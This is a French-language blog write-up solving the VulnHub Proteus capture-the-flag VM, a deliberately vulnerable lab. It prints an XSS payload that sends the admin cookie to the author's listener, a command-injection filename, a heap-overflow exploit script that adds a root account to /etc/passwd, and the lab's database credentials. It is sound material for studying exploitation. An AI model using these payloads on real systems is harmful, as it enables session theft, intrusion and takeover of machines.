# Solution du CTF Proteus de VulnHub

Nitro
-----

[Proteus](https://www.vulnhub.com/entry/proteus-1,193/) est un CTF créé par [@viljoenivan](https://twitter.com/@viljoenivan) et disponible sur VulnHub.  

Le synopsis est le suivant :  

> An IT Company implemented a new malware analysis tool for their employees to scan potentially malicious files.  
> 
> This PoC could be a make or break for the company.  
> 
> It is your task to find the bacterium.  
> 
> Goal: Get root, and get flag... This VM was written in a manner that does not require wget http://exploit; gcc exploit

Oppenheimer
-----------

On a les classiques ports 22 et 80 ainsi qu'un service inconnu et peu bavard :  

```plain
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey:
|   2048 40:3e:c5:6f:dc:63:c5:af:43:51:28:5c:05:f5:98:c2 (RSA)
|_  256 bb:9c:b0:3c:ff:48:8a:2b:37:d2:fe:2e:78:ce:8c:a9 (ECDSA)
80/tcp   open  http
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Proteus | v 1.0
5355/tcp open  unknown
```

L'interface web est plutôt basique mais ressemble beaucoup à des outils existants d'analyse de malware. On pourrait penser qu'il s'agit d'un logiciel open-source existant mais après recherche il semble qu'il n'en est rien.  

![VulnHub CTF Proteus web interface](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/proteus/website.png)

La mire de connexion n'a pas de failles bénignes : à titre d'exemple le message d'erreur n'est pas explicite si on a saisit un nom d'utilisateur ou un mot de passe invalide empêchant ainsi les énumérations.  

Wapiti remonte des anomalies dans le traitement du nom d'utilisateur et sur le nom des fichiers que l'on peut uploader mais il s'agit uniquement d'erreurs 500 donc potentiellement des faux positifs.  

![VulnHub CTF Proteus Wapiti report](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/proteus/wapiti.png)

Quand on uploade un fichier dans le format attendu (binaire ELF) il semble que le site applique les exécutables *strings* et *objdump* dessus.  

L'output obtenu laisse supposer que le nom de fichier est encodé en base64 pour être stocké. De toute façon on ne trouve nul par sur le serveur un endroit où les fichiers auraient pu être déposés.  

*Objdump* semble lui travailler sur un nom de fichier correspondant à une partie du hash du fichier.  

![VulnHub CTF Proteus sample analysis](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/proteus/analysis.png)

Quand on regarde le code source de la page de l'analyse on remarque que certains caractères ne sont pas échappés correctement (ici un guillemet) laissant supposer que l'output de la commande strings n'est pas proprement échappé et donc vulnérable à une faille XSS :  

```html
name<br />
help<br />
version<br />
;*3$"<br />
.shstrtab<br />
.interp<br />
.note.ABI-tag<br />
```

On sait d'après l'interface qu'un administrateur nommé *malwareadm* existe... Et c'est devenu assez fréquent qu'un comportement humain soit simulé sur les CTFs (merci les browsers headless).  

Pour faire propre j'ai utilisé le même javascript que pour [le CTF RedCross](http://devloop.users.sourceforge.net/index.php?article191/solution-du-ctf-redcross-de-hackthebox) :  

```javascript
<script>var img = document.createElement("img"); img.src = "http://192.168.3.254:8000/?" + encodeURI(document.cookie); document.body.appendChild(img);</script>
```

Ça finit par toquer à la porte :  

```plain
Ncat: Version 7.01 ( https://nmap.org/ncat )
Ncat: Listening on :::8000
Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 192.168.3.2.
Ncat: Connection from 192.168.3.2:43926.
GET /?proteus_session=1562973841%257C6DykMjVayEuyDaO2MA75biEkHpbkAeEpgelifplF8t624gsReZu3kbj6FPy%252Fr66tM6LauT9b5v4RGyOJeW6M4qM60m7d%252Fqgz%252BXIsZru6FsbM53W27Dp%252FeBgqtjMuamgk%257Ccbbdae8d8104e586184dd1db69af8c4add06addb HTTP/1.1
Referer: http://127.0.0.1/samples
User-Agent: Mozilla/5.0 (Unknown; Linux i686) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-ZA,*
Host: 192.168.3.254:8000
```

Une fois le cookie injecté dans notre navigateur via *EditThisCookie* on a droit à un bouton supplémentaire pour la suppression des samples :  

![VulnHub CTF Proteus sample admin button](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/proteus/malwareadm.png)

Ce bouton est juste un lien vers *http://192.168.3.2/delete/NWQyOTA4ODgwMDVkMC4=*. La partie encodée correspondant au base64 d'un début de hash et d'un point.  

Ce point terminal est assez étrange et laisse supposer un traitement particulier des extensions. Je ré-uploade donc le binaire avec le nom *yolo.bin* et cette fois on a le base64 *NWQyOTEzYjA4MmMwMy5iaW4=* qui décode à *5d2913b082c03.bin*.  

On mise sur une injection de commande. Je renomme mon fichier (*mv yolo.bin 'yolo.;id;uname -a;'*) et quand je l'uploade :  

![VulnHub CTF Proteus web RCE](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/proteus/command_exec.png)

Un upload de *tsh* plus loin et j'ai mon shell :)  

Sakharov
--------

Une fois sur la box on voit que le site tourne via PHP. Il y a un système de routage des URLs comme on le verrait avec Python/Flask par exemple et on voit différents endroits où *shell\_exec* est appelé :  

```php
route.delete.php:         shell_exec('rm '. Conf::FILE_PATH . base64_decode($filename));
route.samples.php:     $results[base64_encode($file)]['strings'] = shell_exec('strings '. Conf::FILE_PATH . $file);
route.samples.php:     $results[base64_encode($file)]['objdump'] = shell_exec('objdump -d '. Conf::FILE_PATH . $file);
route.submit.php:        shell_exec("chmod +x " . Conf::FILE_PATH . $file->getNameWithExtension());
route.submit.php:        $strings = shell_exec('strings '. Conf::FILE_PATH . $file->getNameWithExtension());
route.submit.php:        $objdump = shell_exec('objdump -d ' . Conf::FILE_PATH . $file->getNameWithExtension());
```

On trouve un fichier de conf avec différents identifiants :  

```php
<?php

class Conf
{

    /* MySQL */
    const MYSQL_USERNAME    =   'root';
    const MYSQL_PASSWORD    =   'viWJ.cgdf&3a]d3xh;C/c]&c?';
    const MYSQL_HOST        =   '127.0.0.1';
    const MYSQL_DATABASE    =   'proteus_db';

    /* Application */
    const DEBUG                 =   false;                          //true/false
    const INSTALLED_DIRECTORY   =   '/';                        //something
    const MAIL_ALIAS                =   'malwareadm@proteus.local';     //Something like user@internet.co.za
    const SECRET                =   'thisisthesecret';          //This is the secret to salt the hashes
    const FILE_PATH             =   '/home/malwareadm/samples/'; //This is the file path of where the execs will be saved
}
```

Cela permet d'accéder à l'instance MySQL locale et d'obtenir le hash du password de malwareadm... mais il ne nous apportera rien ici.  

En revanche il y a un binaire avec des autorisations bien spécifiques (SETUIDDDDDDDDDD !)  

```plain
-rwsr-xr-x 1 root root 7824 May 10  2017 /home/malwareadm/sites/proteus_site/admin_login_logger
```

Quand on lance cet exécutable on a le message suivant :  

```plain
$ ./admin_login_logger
Usage: ./admin_login_logger  ADMIN LOGIN ATTEMPT (This will be done with phantomjs)
```

L'analyse du binaire se fait rapidement avec la dernière version de *Cutter*.  

Il y a deux pointeurs qui sont alloués via *malloc()*. Une première chaîne baptisée *dest* de 450 octets et une seconde nommée *path* de 21 octets.  

![VulnHub CTF Proteus malloc 2 strings](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/proteus/malloc.png)

On a ensuite un beau *strcpy()* sur *dest* avec *argv[1]* comme source. Comme *dest* vient avant *path* dans l'ordre des *malloc()* on est en mesure d'écraser le chunk contenant *path* (heap overflow basique).  

![VulnHub CTF Proteus strcpy vulnerability](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/proteus/strcpy.png)

Et ce path est justement ouvert en écriture pour y placer l'UID utilisateur au format brut (si votre UID est 65 ça écrira le caractère A) suivi des données passées via *argv[1]*.  

Ce path est normalement */var/log/proteus/log* mais du coup on peut le contrôler :  

```plain
./admin_login_logger `python3 -c 'print("A"*450 + "/"*10 + "/tmp//yolo.txt")'`
Writing datafile 0x81501d0: '/////tmp//yolo.txt'
*** Error in `./admin_login_logger': free(): invalid next size (normal): 0x08150008 ***
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x67377)[0xf7da5377]
/lib/i386-linux-gnu/libc.so.6(+0x6d2f7)[0xf7dab2f7]
/lib/i386-linux-gnu/libc.so.6(+0x6dc31)[0xf7dabc31]
./admin_login_logger[0x8048a14]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf7)[0xf7d56637]
./admin_login_logger[0x80485d1]
======= Memory map: ========
08048000-08049000 r-xp 00000000 fd:01 12482883                           /home/nico/Documents/proteus/admin_login_logger
08049000-0804a000 r--p 00000000 fd:01 12482883                           /home/nico/Documents/proteus/admin_login_logger
0804a000-0804b000 rw-p 00001000 fd:01 12482883                           /home/nico/Documents/proteus/admin_login_logger
08150000-08171000 rw-p 00000000 00:00 0                                  [heap]
f7c00000-f7c21000 rw-p 00000000 00:00 0
f7c21000-f7d00000 ---p 00000000 00:00 0
f7d3d000-f7d3e000 rw-p 00000000 00:00 0
f7d3e000-f7eee000 r-xp 00000000 fd:01 9306265                            /lib/i386-linux-gnu/libc-2.23.so
f7eee000-f7ef0000 r--p 001af000 fd:01 9306265                            /lib/i386-linux-gnu/libc-2.23.so
f7ef0000-f7ef1000 rw-p 001b1000 fd:01 9306265                            /lib/i386-linux-gnu/libc-2.23.so
f7ef1000-f7ef4000 rw-p 00000000 00:00 0
f7f08000-f7f24000 r-xp 00000000 fd:01 9310739                            /lib/i386-linux-gnu/libgcc_s.so.1
f7f24000-f7f25000 rw-p 0001b000 fd:01 9310739                            /lib/i386-linux-gnu/libgcc_s.so.1
f7f25000-f7f27000 rw-p 00000000 00:00 0
f7f27000-f7f2a000 r--p 00000000 00:00 0                                  [vvar]
f7f2a000-f7f2c000 r-xp 00000000 00:00 0                                  [vdso]
f7f2c000-f7f4f000 r-xp 00000000 fd:01 9306251                            /lib/i386-linux-gnu/ld-2.23.so
f7f4f000-f7f50000 r--p 00022000 fd:01 9306251                            /lib/i386-linux-gnu/ld-2.23.so
f7f50000-f7f51000 rw-p 00023000 fd:01 9306251                            /lib/i386-linux-gnu/ld-2.23.so
ff8a2000-ff8c3000 rw-p 00000000 00:00 0                                  [stack]
```

On a un crash du à la libération du chunk corrompu à la fin mais le mal est fait.  

On peut écrire dans */etc/passwd* pour l'exploitation, seulement le path destination doit aussi correspondre au shell qui sera exécuté lorsque l'on se connectera avec le compte ajouté.  

La solution que j'ai utilisé est de spécifier une ligne de */etc/passwd* où le shell correspondra à */tmp/backdoor/etc/passwd*. Avec suffisemment de padding le path écrasé sera */etc/passwd* comme attendu et il nous suffira de copier un bash à l'emplacement */tmp/backdoor/etc/passwd* pour rendre notre compte utilisable.  

Voici l'exploit :  

```python
target = "/etc/passwd"
# openssl passwd -1 -salt hacker s3cr3t
new_line = "hacker:$1$hacker$FCIsmt1ka5qjzYea7swTv0:0:0:{}:/root:/tmp/backdoor"
min_length = len(new_line.format(""))
padding = 456 - min_length
payload = new_line.format(padding * "A") + target
print(payload)
```

Et finalement :  

```plain
www-data@Proteus:/home/malwareadm/sites/proteus_site$ ./admin_login_logger `python3 /tmp/exploit.py`
Writing datafile 0x954e1d0: '/etc/passwd'
*** Error in `./admin_login_logger': double free or corruption (!prev): 0x0954e008 ***
www-data@Proteus:/home/malwareadm/sites/proteus_site$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
--- snip ---
malwareadm:x:1000:1000:malwareadm,,,:/home/malwareadm:/bin/bash
mysql:x:112:118:MySQL Server,,,:/nonexistent:/bin/false
!
hacker:$1$hacker$FCIsmt1ka5qjzYea7swTv0:0:0:AAAAAA--- snip ---AAAAAAA:/root:/tmp/backdoor/etc/passwd
www-data@Proteus:/home/malwareadm/sites/proteus_site$ mkdir -p /tmp/backdoor/etc/
www-data@Proteus:/home/malwareadm/sites/proteus_site$ cp /bin/bash /tmp/backdoor/etc/passwd
www-data@Proteus:/home/malwareadm/sites/proteus_site$ su hacker
Password:
root@Proteus:/home/malwareadm/sites/proteus_site# id
uid=0(root) gid=0(root) groups=0(root)
root@Proteus:/home/malwareadm/sites/proteus_site# cd /root
root@Proteus:~# ls
flag.png
root@Proteus:~# md5sum flag.png ;file flag.png
f441dd67d2f453b97775253cf1beb6a4  flag.png
flag.png: PNG image data, 700 x 700, 8-bit/color RGBA, non-interlaced
```

Le point d'exclamation s'explique par le fait que l'uid de www-data est 33.  

D'autres exploitations semblent possibles (crontab, authorized\_keys, script shell existant...)  

Boum
----

On peut profiter de nos privilèges pour changer les permissions sur le flag puis le rapatrier avec *tsh get*.  

![VulnHub CTF Proteus final flag](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/proteus/flag.png)

Ce fut un CTF très intéressant avec une escalade de privilèges originale :)  


*Published July 22 2019 at 21:17*